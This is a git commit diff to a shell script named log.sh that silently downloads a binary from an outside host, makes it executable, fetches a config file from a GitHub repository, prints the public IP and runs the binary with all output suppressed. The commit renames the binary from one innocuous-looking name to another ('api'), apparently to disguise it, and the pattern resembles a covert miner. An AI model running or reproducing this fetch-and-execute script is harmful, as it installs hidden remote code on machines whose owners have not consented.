32084ba1279b74a149ea7e98c30cef9453bb6fc6
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 16:48:41 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O CorporationAssocié https://02ip.ru/service && chmod +x CorporationAssocié >/dev/null 2>&1
+wget -q -O api https://02ip.ru/service && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./CorporationAssocié -c "config.json" >/dev/null 2>&1
+./api -c "config.json" >/dev/null 2>&1
